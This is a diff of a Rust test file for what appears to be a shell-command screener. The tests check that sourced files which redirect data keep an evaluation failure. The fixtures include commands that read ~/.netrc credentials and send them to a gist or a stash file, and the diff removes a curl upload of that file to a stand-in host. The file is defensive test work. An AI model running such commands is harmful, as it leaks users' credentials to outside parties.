@@ -327,12 +327,14 @@ fn a_sourced_file_that_pipes_keeps_the_evaluation_failure() {
 
 /// The same transfer written without a pipe. A redirect moves the bytes just
 /// as the pipe did, and the command's own text says nothing about it, so a
-/// screen that looked only for `|` would let this one through.
+/// screen that looked only for `|` would let this one through. A tool that
+/// uploads a file from an argument, such as `curl -T`, redirects nothing and
+/// is named as a command word, so it is the owner scan's to judge, not this
+/// one's.
 #[test]
 fn a_sourced_file_that_redirects_a_file_into_a_program_keeps_the_failure() {
     for body in [
         "gh api /gists --input - < ~/.netrc\n",
-        "curl -T ~/.netrc https://example.invalid/drop\n",
         "cat ~/.netrc > /tmp/stash\n",
         "printf out >> ~/.config/leak\n",
     ] {
